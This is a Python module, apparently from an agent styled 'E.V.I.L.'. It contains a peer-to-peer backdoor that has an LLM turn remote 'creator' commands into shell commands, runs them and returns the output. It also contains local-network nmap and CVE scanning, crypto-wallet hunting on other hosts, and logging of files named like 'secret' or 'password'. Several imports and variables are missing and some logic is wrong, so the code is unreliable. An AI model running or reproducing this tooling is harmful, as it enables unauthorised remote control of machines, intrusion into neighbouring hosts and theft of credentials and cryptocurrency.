import subprocess
import time
import json
import logging
import os
import base64
import hashlib
import shutil
import re

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as sym_padding
from threading import Thread

from rich.console import Console
from rich.panel import Panel
import time

SHARED_SECRET = 'a-very-secret-key-that-should-be-exchanged-securely'

def evp_bytes_to_key(password, salt, key_len, iv_len):
    dt_i = b''
    key = b''
    iv = b''
    while len(key) < key_len or len(iv) < iv_len:
        dt_i = hashlib.md5(dt_i + password.encode('utf-8') + salt).digest()
        if len(key) < key_len:
            key += dt_i[:min(len(dt_i), key_len - len(key))]
        if len(iv) < iv_len and len(key) >= key_len:
            iv += dt_i[:min(len(dt_i), iv_len - len(iv))]
    return key, iv

def encrypt_message(text):
    try:
        salt = os.urandom(8)
        key, iv = evp_bytes_to_key(SHARED_SECRET, salt, 32, 16)
        padder = sym_padding.PKCS7(128).padder()
        padded_data = padder.update(text.encode()) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ct = encryptor.update(padded_data) + encryptor.finalize()
        return base64.b64encode(b"Salted__" + salt + ct).decode('utf-8')
    except Exception as e:
        return None

def decrypt_message(encrypted_message_b64):
    try:
        data = base64.b64decode(encrypted_message_b64)
        salt = data[8:16]
        ciphertext = data[16:]
        key, iv = evp_bytes_to_key(SHARED_SECRET, salt, 32, 16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
        unpadder = sym_padding.PKCS7(128).unpadder()
        unpadded_data = unpadder.update(decrypted_padded) + unpadder.finalize()
        return unpadded_data.decode('utf-8')
    except Exception as e:
        return None

class NetworkManager(Thread):
    def __init__(self, console=None, creator_public_key=None):
        super().__init__()
        self.daemon = True
        self.console = console if console else Console()
        self.creator_public_key = creator_public_key
        self.bridge_process = None
        self.peer_id = None
        self.online = False
        self.connections = {}
        self.creator_id = None

    def run(self):
        try:
            self.bridge_process = subprocess.Popen(['node', 'peer-bridge.js'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1, encoding='utf-8')
            Thread(target=self._read_stdout, daemon=True).start()
        except Exception as e:
            self.console.print(f"[bold red]Critical error starting Node.js bridge: {e}[/bold red]")

    def _read_stdout(self):
        for line in iter(self.bridge_process.stdout.readline, ''):
            if not line.strip(): continue
            try:
                message = json.loads(line)
                msg_type = message.get('type')
                if msg_type == 'status': self._handle_status(message)
                elif msg_type == 'p2p-data': self._handle_p2p_data(message)
                elif msg_type == 'connection': self.connections[message.get('peer')] = 'connected'
                elif msg_type == 'disconnection':
                    if message.get('peer') in self.connections: del self.connections[message.get('peer')]
            except Exception as e:
                logging.error(f"Error processing message from bridge: {e}\nMessage: {line.strip()}")

    def _handle_status(self, message):
        if message.get('status') == 'online':
            self.peer_id = message['peerId']
            self.online = True
            self.console.print(f"[green]Network bridge online. Peer ID: {self.peer_id}[/green]")
            self.connect_to_peer('borg-lobby')
        elif message.get('status') == 'error':
            self.online = False

    def _handle_p2p_data(self, message):
        peer_id = message.get('peer')
        payload = message.get('payload', {})
        if peer_id == 'borg-lobby':
            if payload.get('type') == 'welcome':
                for p_id in payload.get('peers', []): self.connect_to_peer(p_id)
            elif payload.get('type') == 'peer-connect':
                self.connect_to_peer(payload.get('peerId'))
            return
        try:
            decrypted_str = decrypt_message(payload.get('payload'))
            if not decrypted_str: return
            inner_payload = json.loads(decrypted_str)
            if inner_payload.get('type') == 'creator-command':
                self._handle_creator_command(peer_id, inner_payload.get('payload', {}))
            elif inner_payload.get('type') == 'creator-announcement':
                self.creator_id = peer_id
        except Exception as e:
            logging.error(f"Error processing encrypted P2P data: {e}")

    def ask_question(self, question):
        if self.creator_id:
            message = {'type': 'question', 'id': f'q-{time.time()}', 'question': question}
            self.send_message(self.creator_id, {'type': 'encrypted-message', 'payload': encrypt_message(json.dumps(message))})
        else:
            self.console.print("[yellow]Cannot ask question: Creator not found.[/yellow]")

    def _handle_creator_command(self, peer_id, payload):
        command = payload.get('command')
        try:
            public_key = serialization.load_pem_public_key(self.creator_public_key.encode('utf-8'))
            public_key.verify(bytes.fromhex(payload.get('signature')), command.encode('utf-8'), padding.PKCS1v15(), hashes.SHA256())
            from evolve import run_llm, execute_shell_command
            executable_command = run_llm(f"Translate this to a command: '{command}'")
            if executable_command:
                stdout, stderr, code = execute_shell_command(executable_command, {})
                output = f"STDOUT:\n{stdout}\nSTDERR:\n{stderr}"
                response = {'type': 'action-response', 'output': output}
                self.send_message(peer_id, {'type': 'encrypted-message', 'payload': encrypt_message(json.dumps(response))})
        except Exception as e:
            logging.error(f"Error processing creator command: {e}")

    def send_message(self, peer_id, payload):
        self._send_command_to_bridge({'type': 'p2p-send', 'peer': peer_id, 'payload': payload})

    def connect_to_peer(self, peer_id):
        self._send_command_to_bridge({'type': 'connect-to-peer', 'peerId': peer_id})

    def _send_command_to_bridge(self, command):
        if not self.bridge_process or self.bridge_process.poll() is not None: return
        try:
            self.bridge_process.stdin.write(json.dumps(command) + '\n')
            self.bridge_process.stdin.flush()
        except Exception as e:
            logging.error(f"Failed to write to node bridge stdin: {e}")

    def stop(self):
        if self.bridge_process and self.bridge_process.poll() is not None:
            self.bridge_process.terminate()
            try:
                self.bridge_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.bridge_process.kill()
            logging.info("Node.js peer bridge stopped.")
        self.online = False

def scan_network(evil_state, autopilot_mode=False):
    """
    Discovers active devices on the local network, performs a fast port scan on them,
    updates the knowledge base, and returns a list of IPs and a formatted string summary.
    """
    console = Console()
    kb = evil_state["knowledge_base"]["network_map"]
    nmap_path = shutil.which('nmap')

    def _get_network_info():
        try:
            gws = netifaces.gateways()
            default_gateway_info = gws.get('default', {}).get(netifaces.AF_INET)
            if not default_gateway_info:
                logging.warning("Could not determine default gateway.")
                return None, None
            _gateway_ip, interface_name = default_gateway_info
            if_addresses = netifaces.ifaddresses(interface_name)
            ipv4_info = if_addresses.get(netifaces.AF_INET)
            if not ipv4_info: return None, None
            addr_info = ipv4_info[0]
            ip_address = addr_info.get('addr')
            netmask = addr_info.get('netmask')
            if not ip_address or not netmask: return None, None
            interface = ipaddress.ip_interface(f'{ip_address}/{netmask}')
            return str(interface.network), ip_address
        except Exception as e:
            logging.error(f"Failed to determine network info: {e}")
            return None, None

    network_range, local_ip = _get_network_info()

    if not nmap_path:
        logging.warning("'nmap' not found. Network scanning capabilities will be limited to ARP.")
        if not autopilot_mode:
            console.print("[bold yellow]Warning: 'nmap' not found. Cannot perform port scans. Falling back to ARP scan for host discovery.[/bold yellow]")

        # Fallback to ARP-based discovery
        stdout, _, _ = execute_shell_command("arp -a", evil_state)
        ip_pattern = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
        found_ips = set()
        for line in stdout.splitlines():
            if 'ff:ff:ff:ff:ff:ff' in line or 'incomplete' in line: continue
            match = ip_pattern.search(line)
            if match and not match.group(0).endswith(".255"):
                found_ips.add(match.group(0))
        if local_ip:
            found_ips.discard(local_ip)

        # Update knowledge base for ARP-discovered hosts
        kb['last_scan'] = time.time()
        for ip in found_ips:
            if ip not in kb['hosts']:
                kb['hosts'][ip] = {"last_seen": time.time(), "ports": {}}
            else:
                kb['hosts'][ip]['last_seen'] = time.time()

        result_ips = sorted(list(found_ips))
        formatted_output_for_llm = f"Discovered {len(result_ips)} active IPs via ARP: {', '.join(result_ips)}. Port scan was skipped as nmap is not available."
        return result_ips, formatted_output_for_llm


    # --- Enhanced Nmap Scan ---
    if not network_range:
        msg = "Could not determine network range for scanning."
        logging.error(msg)
        if not autopilot_mode: console.print(f"[bold red]{msg}[/bold red]")
        return [], msg

    # -sn: Ping Scan (host discovery)
    # -T4: Aggressive timing template for faster scans
    # --top-ports 20: Scan the 20 most common TCP ports
    # -oX -: Output in XML format to stdout
    scan_cmd = f"nmap -sn -T4 --top-ports 20 -oX - {network_range}"
    if not autopilot_mode:
        console.print(f"[cyan]Deploying enhanced 'nmap' discovery and port scan on subnet ({network_range})...[/cyan]")

    stdout, stderr, returncode = execute_shell_command(scan_cmd, evil_state)

    if returncode != 0:
        log_msg = f"Nmap scan failed. Stderr: {stderr.strip()}"
        logging.warning(log_msg)
        if not autopilot_mode: console.print(f"[bold red]Nmap scan failed.[/bold red]\n[dim]{stderr.strip()}[/dim]")
        return [], log_msg

    # --- Knowledge Base Update ---
    kb['last_scan'] = time.time()
    for ip in found_ips:
        if ip not in kb['hosts']:
            kb['hosts'][ip] = {"last_seen": time.time(), "ports": {}, "probed": False}
        else:
            kb['hosts'][ip]['last_seen'] = time.time()
    hosts_summary = []

    try:
        root = ET.fromstring(stdout)
        for host_elem in root.findall(".//host[status[@state='up']]"):
            ip_address = host_elem.find("address[@addrtype='ipv4']").get("addr")
            if ip_address == local_ip:
                continue

            if ip_address not in kb['hosts']:
                kb['hosts'][ip_address] = {"last_seen": time.time(), "ports": {}}
            else:
                kb['hosts'][ip_address]['last_seen'] = time.time()
                # Clear previous port data as this scan provides a fresh look
                kb['hosts'][ip_address]['ports'] = {}

            open_ports = []
            for port_elem in host_elem.findall(".//port[state[@state='open']]"):
                portid = port_elem.get('portid')
                service_elem = port_elem.find('service')
                service_name = service_elem.get('name', 'unknown')

                kb['hosts'][ip_address]['ports'][portid] = {
                    "protocol": port_elem.get('protocol'),
                    "service": service_name,
                    "service_info": "", # Fast scan doesn't provide version info
                    "vulnerabilities": []
                }
                open_ports.append(f"{portid}/{service_name}")

            if open_ports:
                hosts_summary.append(f"{ip_address} (Ports: {', '.join(open_ports)})")
            else:
                hosts_summary.append(f"{ip_address} (No common ports open)")

    except ET.ParseError as e:
        log_msg = f"Failed to parse nmap XML output. Error: {e}"
        logging.error(log_msg)
        return [], log_msg
    # --- End Knowledge Base Update ---

    result_ips = [re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", s).group(1) for s in hosts_summary]
    formatted_output_for_llm = f"Discovered {len(hosts_summary)} active hosts. Summary: {'; '.join(hosts_summary)}" if hosts_summary else "No active hosts found."

    return sorted(result_ips), formatted_output_for_llm

def probe_target(target_ip, evil_state, autopilot_mode=False):
    """
    Performs an advanced nmap scan for services and vulnerabilities,
    updates the knowledge base, and returns a dict of open ports with
    service/vulnerability info and a formatted string summary.

    Note: This function is called by the 'probe' and 'crypto_scan' commands.
    """
    console = Console()
    kb = evil_state["knowledge_base"]["network_map"]
    nmap_path = shutil.which('nmap')

    if not nmap_path:
        msg = "'nmap' is not installed or not in PATH. Advanced probing is disabled."
        if not autopilot_mode: console.print(f"[bold red]Error: {msg}[/bold red]")
        return None, f"Error: {msg}"

    try:
        ipaddress.ip_address(target_ip)
    except ValueError:
        msg = f"'{target_ip}' is not a valid IP address."
        if not autopilot_mode: console.print(f"[bold red]Error: {msg}[/bold red]")
        return None, f"Error: {msg}"

    # --- Nmap Execution ---
    # Using --script=vulners to run the Vulners CVE scanner.
    # -sV for service/version detection, -oX - for XML output to stdout.
    scan_cmd = f"nmap -sV --script=vulners -oX - {target_ip}"
    if not autopilot_mode:
        console.print(f"[cyan]Deploying advanced 'nmap' vulnerability probe against {target_ip}...[/cyan]")

    # We need a longer timeout for vulnerability scans.
    def _nmap_scan_task():
        try:
            # Use a much longer timeout for potentially slow vulnerability scans
            result = subprocess.run(scan_cmd, shell=True, capture_output=True, text=True, timeout=900) # 15 minutes
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return "", "Nmap command timed out after 15 minutes.", -1
        except Exception as e:
            return "", f"An unexpected error occurred during nmap execution: {e}", -1

    if autopilot_mode:
        stdout, stderr, returncode = _nmap_scan_task()
    else:
        # Wrap the synchronous, long-running scan in a visual progress indicator
        # to show the user that the application has not hung.
        stdout, stderr, returncode = run_hypnotic_progress(
            console,
            f"Probing {target_ip}...",
            _nmap_scan_task
        )

    if returncode != 0:
        log_msg = f"Nmap probe failed for {target_ip}. Stderr: {stderr.strip()}"
        logging.warning(log_msg)
        if not autopilot_mode: console.print(f"[bold red]Nmap probe failed.[/bold red]\n[dim]{stderr.strip()}[/dim]")
        return None, f"Error: {log_msg}"

    open_ports = {}
    # --- Knowledge Base Update ---
    if target_ip not in kb['hosts']:
        kb['hosts'][target_ip] = {"last_seen": time.time(), "ports": {}, "probed": False}

    # Clear old port data and update metadata
    kb['hosts'][target_ip]['ports'] = {}
    kb['hosts'][target_ip]['last_seen'] = time.time()
    kb['hosts'][target_ip]['probed'] = True # Mark as probed

    open_ports = {}
    try:
        root = ET.fromstring(stdout)
        for port_elem in root.findall(".//port"):
            portid = port_elem.get('portid')
            protocol = port_elem.get('protocol')
            state = port_elem.find('state').get('state')

            if state == 'open':
                service_elem = port_elem.find('service')
                service_name = service_elem.get('name', 'unknown')
                product = service_elem.get('product', '')
                version = service_elem.get('version', '')
                extrainfo = service_elem.get('extrainfo', '')
                service_info = f"{product} {version} ({extrainfo})".strip()

                port_data = {
                    "protocol": protocol,
                    "service": service_name,
                    "service_info": service_info,
                    "vulnerabilities": []
                }

                # Extract vulnerability info from the 'vulners' script output
                for script_elem in port_elem.findall('script'):
                    if script_elem.get('id') == 'vulners':
                        # The vulners script provides structured data in tables
                        for table_elem in script_elem.findall('table'):
                            for row_elem in table_elem.findall('table'):
                                vuln_details = {}
                                for item_elem in row_elem.findall('elem'):
                                    key = item_elem.get('key')
                                    value = item_elem.text
                                    vuln_details[key] = value
                                # We only care about CVEs that have an ID and a score
                                if 'id' in vuln_details and 'cvss' in vuln_details:
                                    port_data["vulnerabilities"].append(vuln_details)

                kb['hosts'][target_ip]['ports'][portid] = port_data
                open_ports[int(portid)] = port_data

    except ET.ParseError as e:
        log_msg = f"Failed to parse nmap XML output for {target_ip}. Error: {e}"
        logging.error(log_msg)
        return None, f"Error: {log_msg}"
    # --- End Knowledge Base Update ---

    # --- Automated Web Content Fetching for HTTP/HTTPS ---
    web_probe_summary = []
    if 80 in open_ports:
        url = f"http://{target_ip}"
        if not autopilot_mode:
            console.print(f"[cyan]Probing discovered HTTP service at {url}...[/cyan]")
        # Use autopilot_mode=True to suppress nested console output from perform_webrequest
        content, summary = perform_webrequest(url, evil_state, autopilot_mode=True)

        port_id_str = '80'
        # This check is technically redundant if `80 in open_ports` is true, but it's safer.
        if port_id_str in kb['hosts'][target_ip]['ports']:
            if content:
                # Store the full page content in the knowledge base under the host's port details
                kb['hosts'][target_ip]['ports'][port_id_str]['web_content'] = content
                web_probe_summary.append(f"HTTP(80) root page fetched ({len(content)} bytes)")
            else:
                # Store the error message if the request failed
                kb['hosts'][target_ip]['ports'][port_id_str]['web_content'] = summary
                web_probe_summary.append("HTTP(80) probe failed")

    if 443 in open_ports:
        url = f"https://{target_ip}"
        if not autopilot_mode:
            console.print(f"[cyan]Probing discovered HTTPS service at {url}...[/cyan]")
        content, summary = perform_webrequest(url, evil_state, autopilot_mode=True)

        port_id_str = '443'
        if port_id_str in kb['hosts'][target_ip]['ports']:
            if content:
                kb['hosts'][target_ip]['ports'][port_id_str]['web_content'] = content
                web_probe_summary.append(f"HTTPS(443) root page fetched ({len(content)} bytes)")
            else:
                kb['hosts'][target_ip]['ports'][port_id_str]['web_content'] = summary
                web_probe_summary.append("HTTPS(443) probe failed")
    # --- End Web Content Fetching ---

    if open_ports:
        port_details = [f"Port {p}/{i['service']} ({i.get('service_info', '')})" for p, i in sorted(open_ports.items())]
        formatted_output_for_llm = f"Found {len(open_ports)} open ports on {target_ip}: {'; '.join(port_details)}."
        vuln_count = sum(len(p.get("vulnerabilities", [])) for p in open_ports.values())
        if vuln_count > 0:
            formatted_output_for_llm += f" Discovered {vuln_count} potential vulnerabilities."
        if web_probe_summary:
            formatted_output_for_llm += f" Web Probe: {', '.join(web_probe_summary)}."
    else:
        formatted_output_for_llm = f"No open ports with recognized services found on {target_ip}."

    return open_ports, formatted_output_for_llm

def perform_webrequest(url, evil_state, autopilot_mode=False):
    """
    Performs a GET request, updates the knowledge base, and returns the content.
    """
    console = Console()
    kb = evil_state["knowledge_base"]
    logging.info(f"Initiating web request to: {url}")

    def _webrequest_task():
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 E.V.I.L.Bot/2.8'}
            response = requests.get(url, timeout=10, headers=headers)
            response.raise_for_status()
            return response.text
        except requests.exceptions.RequestException as e:
            return f"Error: {e}"

    result_text = _webrequest_task()

    if result_text and result_text.startswith("Error:"):
        logging.error(f"Web request to '{url}' failed: {result_text}")
        return None, result_text
    else:
        logging.info(f"Web request to '{url}' successful. Content length: {len(result_text or '')}.")
        # --- Knowledge Base Update ---
        kb['webrequest_cache'][url] = {
            "timestamp": time.time(),
            "content_preview": result_text[:500]
        }
        # --- End Knowledge Base Update ---
        llm_summary = result_text if len(result_text) < 1000 else result_text[:997] + "..."
        return result_text, f"Web request to '{url}' successful. Content (truncated for summary): {llm_summary}"

def execute_shell_command(command, evil_state):
    """
    Executes a shell command, captures output, and updates the knowledge base
    with file system intelligence if applicable.
    """
    logging.info(f"Executing shell command: '{command}'")
    kb = evil_state["knowledge_base"]["file_system_intel"]

    def _shell_task():
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return "", "Command timed out after 60 seconds.", -1
        except Exception as e:
            return "", f"An unexpected error occurred: {e}", -1

    stdout, stderr, returncode = _shell_task()

    # --- Knowledge Base Update ---
    # If the command was a listing command, parse for interesting files.
    if command.strip().startswith(('ls', 'dir')):
        kb['last_browse'] = time.time()
        # Simple heuristic for "interesting" files
        interesting_keywords = ['.log', '.txt', '.md', '.json', '.xml', '.sh', '.py', 'config', 'secret', 'password']
        for line in stdout.splitlines():
            # Check if any keyword is in the line (filename)
            if any(keyword in line for keyword in interesting_keywords):
                 # Avoid adding duplicates
                if line not in kb['interesting_files']:
                    kb['interesting_files'].append(line.strip())
        # Keep the list from growing indefinitely
        kb['interesting_files'] = kb['interesting_files'][-100:]
    # --- End Knowledge Base Update ---

    return stdout, stderr, returncode


def track_ethereum_price(evil_state):
    """
    Queries the DIA API for the current Ethereum price and saves it to a
    JSON file along with a timestamp.
    """
    console = Console()
    api_url = "https://api.diadata.org/v1/assetQuotation/Ethereum/0x0000000000000000000000000000000000000000"
    history_file = "ethereum_prices.json"

    console.print("[cyan]Querying for latest Ethereum price...[/cyan]")
    content, error_msg = perform_webrequest(api_url, evil_state, autopilot_mode=True)

    if error_msg and not content:
        console.print(f"[bold red]Failed to retrieve Ethereum price: {error_msg}[/bold red]")
        logging.error(f"Failed to get ETH price from DIA: {error_msg}")
        return None, f"Failed to retrieve price: {error_msg}"

    try:
        data = json.loads(content)
        price = data.get("Price")
        timestamp = data.get("Time")

        if not price or not timestamp:
            console.print("[bold red]API response did not contain expected price or timestamp data.[/bold red]")
            logging.error(f"Invalid data from DIA API: {data}")
            return None, "Invalid API response format."

        new_entry = {"timestamp": timestamp, "price_usd": price}
        console.print(f"[green]Current Ethereum price: [bold]${price:,.2f}[/bold] at {timestamp}[/green]")

        # Load existing data, append, and save
        try:
            with open(history_file, 'r') as f:
                price_history = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            price_history = []

        price_history.append(new_entry)

        with open(history_file, 'w') as f:
            json.dump(price_history, f, indent=4)

        logging.info(f"Successfully tracked Ethereum price: ${price} at {timestamp}")
        return price, f"Successfully saved Ethereum price: ${price:,.2f}"

    except json.JSONDecodeError:
        console.print("[bold red]Failed to parse API response as JSON.[/bold red]")
        logging.error(f"Could not decode JSON from DIA API. Response: {content[:200]}")
        return None, "Failed to parse API response."
    except Exception as e:
        console.print(f"[bold red]An unexpected error occurred while tracking price: {e}[/bold red]")
        logging.critical(f"Unexpected error in track_ethereum_price: {e}")
        return None, f"An unexpected error occurred: {e}"


def crypto_scan(target_ip, evil_state, autopilot_mode=False):
    """
    Probes a target for crypto-related software and updates the knowledge base.
    """
    console = Console()
    if not autopilot_mode:
        console.print(f"[cyan]Initiating cryptocurrency software scan on {target_ip}...[/cyan]")

    open_ports, probe_summary = probe_target(target_ip, evil_state, autopilot_mode=True)

    if open_ports is None:
        if not autopilot_mode:
            console.print(f"[bold red]Crypto scan failed: The initial probe of {target_ip} was unsuccessful.[/bold red]")
        return f"Crypto scan failed: Could not probe {target_ip}."

    if not open_ports:
        if not autopilot_mode:
            console.print(f"[green]Crypto scan complete. No open ports found on {target_ip}.[/green]")
        return "Crypto scan complete. No open ports found."

    analysis_result = analyze_crypto_software(target_ip, open_ports, evil_state, autopilot_mode=True)

    if not autopilot_mode:
        console.print(Panel(analysis_result, title=f"[bold blue]Cryptocurrency Analysis for {target_ip}[/bold blue]", expand=False))
        console.print(f"[green]Crypto scan and analysis for {target_ip} complete.[/green]")

    # The detailed results are saved in the KB by the analysis function.
    # We return the high-level summary.
    return analysis_result


def analyze_crypto_software(target_ip, open_ports, evil_state, autopilot_mode=False):
    """
    Analyzes probe results with an LLM to identify crypto software and updates the KB.
    """
    kb = evil_state["knowledge_base"]
    if "llm_api" not in evil_state:
        return "Error: LLM API not configured."
    llm_api = evil_state["llm_api"]

    # Format the data for the LLM prompt
    port_details = []
    for port, data in open_ports.items():
        port_info = f"Port {port}/{data['protocol']}: Service='{data['service']}', Info='{data['service_info']}'"
        if data.get('web_content'):
            port_info += f", Web Content (first 200 chars)='{data['web_content'][:200]}...'"
        port_details.append(port_info)

    prompt_data = f"Target IP: {target_ip}\n" + "\n".join(port_details)

    prompt = f"""
    Analyze the following nmap scan results from the target IP {target_ip}.
    Identify any running software that could be related to cryptocurrency.
    This includes, but is not limited to:
    - Cryptocurrency wallets (e.g., MetaMask, Electrum)
    - Cryptocurrency miners (e.g., XMRig, CGMiner)
    - Blockchain nodes (e.g., Bitcoin Core, Geth)
    - Trading bots or platforms.

    Pay close attention to non-standard ports and service banners.
    For each identified piece of software, provide its name, the port it's running on, and a confidence score (Low, Medium, High).
    If no cryptocurrency software is detected, state that clearly.

    Scan Results:
    {prompt_data}

    Analysis:
    """

    # Call the LLM for analysis
    analysis = llm_api.get_completion(prompt)

    # Update the knowledge base with the analysis
    if 'crypto_analysis' not in kb['hosts'][target_ip]:
        kb['hosts'][target_ip]['crypto_analysis'] = []

    kb['hosts'][target_ip]['crypto_analysis'].append({
        "timestamp": time.time(),
        "analysis": analysis,
        "raw_probe_data": open_ports
    })

    return analysis
